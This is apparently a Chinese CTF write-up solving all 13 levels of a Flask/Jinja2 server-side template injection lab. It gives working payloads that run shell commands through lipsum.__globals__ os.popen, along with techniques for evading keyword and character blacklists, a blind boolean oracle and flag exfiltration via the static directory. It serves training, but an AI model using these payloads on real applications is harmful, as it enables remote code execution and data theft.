# SSTILab（X3NNY/sstilabs）13 关全通

> 平台：NSSCTF 动态实例 —— `http://node5.anna.nssctf.cn:<端口>/level/N`（几小时回收，端口会变；本会话用过 25208 / 21554 / 29371）
> 后端：Werkzeug/2.0.1 + Python/3.9.6 + Flask 1.1.1
> 时间：2026-10-11 起，2026-10-12 全通 ｜ 进度：**13 / 13 关**
> 可复跑脚本：`sstilab_solve.py`（换实例直接重跑）｜ 实测输出：`sstilab_solve_output.txt`

## 一、题目公共信息

| 项 | 内容 |
|---|---|
| 入口 | `GET /level/N` 返回页面；`POST /level/N` 才是注入 |
| 注入参数 | 表单参数 `code`（页面 `<input name="code">`） |
| 响应格式 | 成功 → `Hello <渲染结果>`；抛异常 → `No this level`；被拦 → `Hello WAF` |
| flag 位置 | `/app/flag`（**不在** `/flag`） |
| 源码 | `/app/app.py`、`/app/level/level.py`（13 关黑名单都在里面） |

```python
@app.route('/level/<int:lev>', methods=['GET', 'POST'])
def level1(lev):
    if request.method == "GET":
        return render_template("level.html", level=lev)
    try:
        code = request.form.get('code')
        res = getattr(level, 'level' + str(lev))(code)      # 每关的黑名单
        return render_template_string("Hello %s" % res)      # 注入点
    except Exception:
        return "No this level"
```

两句话本质：漏洞点是「用户输入被拼进模板源」；13 关的差别只在 `levelN(code)` 的黑名单。

一条贯穿全局的规律：黑名单查的是**你发出去的原文**，而 `~` 拼接在渲染时生效、`\x5f` 转义在编译时还原 —— 检查在前、还原在后，中间那道缝就是绕过点。

## 二、13 关总览

| 关 | 黑名单 / 机制 | 一句话绕过 |
|---|---|---|
| 1 | 无 | 直接用框架全局链 |
| 2 | `{{` | 换定界符：`{% print(...) %}` |
| 3 | 盲注（只回 correct / wrong） | 布尔 oracle 或写文件外带 |
| 4 | `[` `]` | 中括号换点号：`.os` |
| 5 | `'` `"` | 字符串从请求参数来 |
| 6 | `_` | 下划线写转义：`\x5f` |
| 7 | `.` | 点号换 `\|attr('名字')` |
| 8 | class arg form value data request init global open mro base attr | 关键词用 `~` 切碎 |
| 9 | 数字 `0-9` | 全局链本来就不用数字 |
| 10 | 预置 `config=None` `self=None` | 换 `lipsum` 当起点 |
| 11 | `'` `"` `+` request `.` `[` `]` | `dict(名=1)\|first` 造字符串 + `~` 拼命令 |
| 12 | `_` `.` 数字 `\` `'` `"` `[` `]` | 参数带名字 + `dict` 取值 |
| 13 | `_` `.` `\` `'` `"` request `+` class init arg config app self `[` `]` | 从字符串里抠下划线造 dunder |

## 三、逐关详解

### 第 1 关：无过滤

```python
def level1(code):
    return code
```

```jinja
{{ lipsum.__globals__['os'].popen('cat /app/flag').read() }}
```

实测：`Hello SSTILAB{enjoy_flask_ssti}`

| 段 | 拿到什么 | 原理 |
|---|---|---|
| `lipsum` | Jinja2 的默认全局函数 | `jinja2.defaults.DEFAULT_NAMESPACE` 之一，不用传就能用 |
| `.__globals__` | `jinja2.utils` 模块的全局字典 | 函数对象携带「定义它的模块」的全局空间 |
| `['os']` | `<module 'os'>` | `jinja2/utils.py` 顶部 `import os` |
| `.popen(...)` | 可读管道 | `os.popen` 起 shell，返回能读输出的对象 |
| `.read()` | 命令输出 | **必须读**；`os.system` 没有回显 |

等价写法：`url_for.__globals__['os']`、`config.__class__.__init__.__globals__['os']`、`cycler.__init__.__globals__.os`、
`lipsum.__globals__['__builtins__']['open']('/app/flag').read()`。

### 第 2 关：禁 `{{`

```python
def level2(code):
    return "WAF" if "{{" in code else code
```

```jinja
{% print(lipsum.__globals__['os'].popen('cat /app/flag').read()) %}
```

实测：`Hello SSTILAB{enjoy_flask_ssti}`

原理：Jinja2 有三种定界符 —— `{{ }}` 输出表达式、`{% %}` 语句块、`{# #}` 注释，它只禁了第一种。
`{% %}` 里能输出的四种手段（都实测过）：`{% print(expr) %}`、`{% set a=expr %}{% print(a) %}`、
`{% if 条件 %}LEAKED{% endif %}`（盲注地基）、`{% for i in [expr] %}LOOP{% endfor %}`。

### 第 3 关：盲注（只回 correct / wrong）

```python
def level3(code):
    try:
        render_template_string(code)     # 结果不返回
        return "correct"
    except Exception:
        return "wrong"
```

每次请求只有 1 bit。两条路：

路 1 · 布尔 oracle

```jinja
{% if lipsum.__globals__['os'].popen('cat /app/flag').read().startswith('SSTILAB') %}ok{% else %}{{ 1/0 }}{% endif %}
```

实测：真条件 → `Hello correct`；`startswith('XXXX')` → `Hello wrong`。

假分支必须用**真的会抛异常**的写法（实测对照）：

| 写法 | 结果 | 原因 |
|---|---|---|
| `{{1/0}}` | wrong | ZeroDivisionError |
| `{{ [].pop() }}` | wrong | IndexError（方法调用） |
| `{{ 'a'.nope.x }}` | wrong | UndefinedError |
| `{{ [][0] }}` | **correct** | Jinja2 把 LookupError 吞成 Undefined，**不抛异常** |

路 2 · 副作用外带（更省事，推荐先试）

```jinja
{% set x = lipsum.__globals__['os'].popen('cat /app/flag > /app/static/l3.txt').read() %}
```

实测：`Hello correct`，随后 `GET /static/l3.txt` → `SSTILAB{enjoy_flask_ssti}`。
前提：有写权限（本题 `uid=0`）+ 静态目录对外可访问（Flask 默认挂 `/static`）。

### 第 4 关：禁 `[` `]`

```jinja
{{ lipsum.__globals__.os.popen('cat /app/flag').read() }}
```

实测：`Hello SSTILAB{enjoy_flask_ssti}`

原理：`__globals__` 是字典，字典的点号取值**会回退到下标**（Jinja2 的 `.` 先 getattr、失败再 getitem），所以 `['os']` 能写成 `.os`。
另一条：`|attr('__getitem__')('os')`（`|attr` 只做 getattr，必须显式走 `__getitem__`）。

### 第 5 关：禁 `'` `"`

名字不能写字面量，就从**请求参数**拿（参数不受黑名单限制）：

```jinja
{{ lipsum|attr(request.form.a)|attr(request.form.b)(request.form.c)|attr(request.form.d)(request.form.e)|attr(request.form.f)() }}
```

POST 一并带上：`a=__globals__`、`b=__getitem__`、`c=os`、`d=popen`、`e=cat /app/flag`、`f=read`

实测：`Hello SSTILAB{enjoy_flask_ssti}`（payload 里一个引号都没有）

### 第 6 关：禁 `_`

```jinja
{{ lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('cat /app/flag')|attr('read')() }}
```

实测：`Hello SSTILAB{enjoy_flask_ssti}`

原理：`\x5f` 是下划线转义，**编译期**才还原成 `_`；过滤看的是原始输入（里面没有下划线）。

### 第 7 关：禁 `.`

```jinja
{{ lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('cat /app/flag')|attr('read')() }}
```

实测：`Hello SSTILAB{enjoy_flask_ssti}`

原理：属性访问换成 `|attr('名字')` 过滤器 —— 属性名变成字符串，原文里就没有点号。

### 第 8 关：关键词黑名单

```python
bl = ["class", "arg", "form", "value", "data", "request", "init", "global", "open", "mro", "base", "attr"]
```

名单很毒：`__globals__` 含 `global`、`popen`/`open` 含 `open`、`__init__` 含 `init`、`__mro__` 含 `mro`、
`|attr(...)` 含 `attr`、`request`/`form` 被点名。出路是**把词切碎**（`~` 到渲染时才拼起来）：

```jinja
{{ lipsum['__glo'~'bals__']['__buil'~'tins__']['__im'~'port__']('subprocess')['check'~'_out'~'put']('cat /app/flag', shell=True)['decode']() }}
```

实测：`Hello SSTILAB{enjoy_flask_ssti}`（`check_output` 返回 bytes，再 `.decode()`）

要点：`__globals__` → `['__glo'~'bals__']`；`popen` 含 `open` 被禁 → 换 `subprocess.check_output(..., shell=True)`。

### 第 9 关：禁数字 `0-9`

```jinja
{{ lipsum.__globals__['os'].popen('cat /app/flag').read() }}
```

实测：`Hello SSTILAB{enjoy_flask_ssti}`

原理：这条链**本来就不需要数字** —— 只有「枚举 `__subclasses__()` 下标」那条路才要写数字；框架全局链全是名字，天然免疫。

### 第 10 关：预置 `config` / `self` 为空

```python
return "{% set config=None%}{% set self=None%}" + code
```

```jinja
{{ lipsum.__globals__['os'].popen('cat /app/flag').read() }}
```

实测：`Hello SSTILAB{enjoy_flask_ssti}`

原理：它只把 `config` / `self` 两个名字置空，`lipsum`（以及 `cycler` / `joiner` / `namespace`）不受影响。
思路：遇到「某个名字被废掉」时，先想**同一类起点还有几个**。

### 第 11 关：禁 `'` `"` `+` request `.` `[` `]`

引号、点号、中括号全禁，参数通道（`request`）也被堵死 —— 只能在模板内部造字符串：

```jinja
{{ lipsum|attr(dict(__globals__=1)|first)|attr(dict(__getitem__=1)|first)(dict(os=1)|first)|attr(dict(popen=1)|first)((dict(cat=1)|first)~((lipsum|string)|first)~(lipsum|attr(dict(__globals__=1)|first)|attr(dict(__getitem__=1)|first)(dict(__file__=1)|first)|first)~(dict(ap=1)|first)~(dict(p=1)|first)~(lipsum|attr(dict(__globals__=1)|first)|attr(dict(__getitem__=1)|first)(dict(__file__=1)|first)|first)~(dict(flag=1)|first))|attr(dict(read=1)|first)() }}
```

实测：`Hello SSTILAB{enjoy_flask_ssti}`

| 要造的东西 | 怎么造 | 说明 |
|---|---|---|
| 任意名字字符串 | `dict(名字=1)\|first` | kwargs 的键不用引号，`\|first` 取出键名 → `'__globals__'` |
| 斜杠 `/` | `...('__file__')\|first` | `jinja2.utils.__file__` 路径首字符就是 `/` |
| 空格 | 干脆不用 | 命令写 `cat</app/flag`（shell 重定向，等价且无空格） |

拼接全部用 `~`（`+` 被禁）。

### 第 12 关：禁 `_` `.` 数字 `\` `'` `"` `[` `]`

下划线和数字都被禁 → 连 `dict(a=1)` 里的 `1` 都不能写（改用 `true`），名字只能从**查询参数**取：

```jinja
{% set r = request|attr(dict(args=true)|first)|attr(dict(get=true)|first) %}{{ lipsum|attr(r(dict(a=true)|first))|attr(r(dict(b=true)|first))(r(dict(c=true)|first))|attr(r(dict(d=true)|first))(r(dict(e=true)|first))|attr(r(dict(f=true)|first))() }}
```

查询串一并带上：`?a=__globals__&b=__getitem__&c=os&d=popen&e=cat /app/flag&f=read`

实测：`Hello SSTILAB{enjoy_flask_ssti}`

要点：取参数不用点号 —— `request|attr(dict(args=true)|first)|attr(dict(get=true)|first)` 就是 `request.args.get`；
数值用 `true` 占位；名字都在 URL 里，不在 `code` 里。

### 第 13 关：全禁（最难）

```python
bl = ['_', '.', '\\', "'", '"', 'request', '+', 'class', 'init', 'arg', 'config', 'app', 'self', '[', ']']
```

`request` 被点名 → 参数通道没了；下划线又被禁 → 连 `__globals__` 都写不出来。解法是**从字符串里抠下划线**：

```jinja
{% set u = lipsum|string|list|batch(19)|first|last %}{% set G = (u~u)~(dict(globals=true)|first)~(u~u) %}{% set GI = (u~u)~(dict(getitem=true)|first)~(u~u) %}{% set gl = lipsum|attr(G) %}{% set sl = gl|attr(GI)((u~u)~(dict(file=true)|first)~(u~u))|first %}{% set cmd = (dict(cat=true)|first)~((lipsum|string)|first)~sl~(dict(ap=true)|first)~(dict(p=true)|first)~sl~(dict(flag=true)|first) %}{{ gl|attr(GI)(dict(os=true)|first)|attr(dict(popen=true)|first)(cmd)|attr(dict(read=true)|first)() }}
```

实测：`Hello SSTILAB{enjoy_flask_ssti}`（payload 共 946 字符）

| 要造的东西 | 怎么造 | 说明 |
|---|---|---|
| 下划线 `_` | `lipsum\|string\|list\|batch(19)\|first\|last` | `lipsum` 的 repr 是 `<function generate_lorem_ipsum at 0x...>`，第 19 个字符正是 `_`（实测） |
| `__globals__` | `(u~u)~(dict(globals=true)\|first)~(u~u)` | 用抠出的下划线拼 dunder；`globals` 本身不含下划线 |
| 斜杠 `/` | `...('__file__')\|first` | 取 `jinja2/utils.py` 路径首字符 |
| `app` | `dict(ap=true)\|first~dict(p=true)\|first` | `app` 在黑名单里，必须切两半 |
| 命令无空格 | `cat</app/flag` | 用 shell 重定向代替空格 |

`url_for`、`get_flashed_messages` 这些名字自带下划线，第 13 关也写不出来 —— 所以这一关**不能**走参数通道，
只能用 `lipsum` 这条纯字母名字的链。

## 四、可复跑脚本

```powershell
cd D:\deepseek\task8\4-靶场实践
python sstilab_solve.py                                     # 默认实例
python sstilab_solve.py http://node5.anna.nssctf.cn:29371   # 指定实例
```

结果：`13 / 13 关通过`。脚本把 13 关 payload 全部固化（含 L11~L13 的构造件），换实例直接重跑。

## 五、方法论总结

三抽屉模型（遇到过滤就在这三个抽屉里换零件）

| 抽屉 | 有哪几种 | 什么时候用 |
|---|---|---|
| 字符串从哪来 | 字面量 / `~` 拼接 / `\x5f` 转义 / `dict(名=1)\|first` / 请求参数 / 从对象抠字符 | 引号、关键词、下划线被禁 |
| 属性怎么取 | `.` / `['键']` / `\|attr('键')` / `\|attr('__getitem__')('键')` / `\|first` `\|last` | 点号、中括号被禁 |
| 结果怎么写 | `{{ }}` / `{% print %}` / `{% if %}字面量{% endif %}` | 定界符被禁 / 盲注 |

时间差原理：黑名单查的是原文；`~` 在渲染期拼接、`\x5f` 在编译期还原 → 检查在前、还原在后。

三条通用意识：先探规则再打；黑名单只查 `code`（查询参数/表单字段是自由通道）；名字写不出来就现造。

## 六、踩坑记录

| 坑 | 现象 | 原因 | 解决 |
|---|---|---|---|
| 参数放错位置 | 第 5 关回 `No this level` | payload 用 `request.args`（查询串），参数却放在 POST body | 用 `request.form`，或把参数放 query |
| `SESSION_COOKIE_PATH` 不是 `/` | 第 11 关命令变成 `cat<NoneappNoneflag` | Flask 该配置默认值是 **None** | 换成 `__file__` 取斜杠 |
| 第 12 关数字黑名单 | `dict(a=1)` 直接被拦 | 黑名单含 `0-9` | 值改用 `true` |
| 第 13 关写了 `url_for` | 回 `Hello WAF` | `url_for` 自带下划线，被 `_` 拦 | 用纯字母的 `lipsum` 当起点 |
| 第 13 关写了 `app` | 回 `Hello WAF` | `app` 在关键词黑名单里 | 拆成 `dict(ap=true)\|first~dict(p=true)\|first` |
| 假分支用 `{{ [][0] }}` | 盲注一直回 correct | Jinja2 把 LookupError 吞成 Undefined | 用 `{{1/0}}` 或 `{{ [].pop() }}` |
| Python 里写 payload 被 `%` 坑 | `ValueError: unsupported format character '}'` | payload 里有 `%}`，和 `%` 格式化冲突 | 用字符串拼接，别用 `%` 格式化 |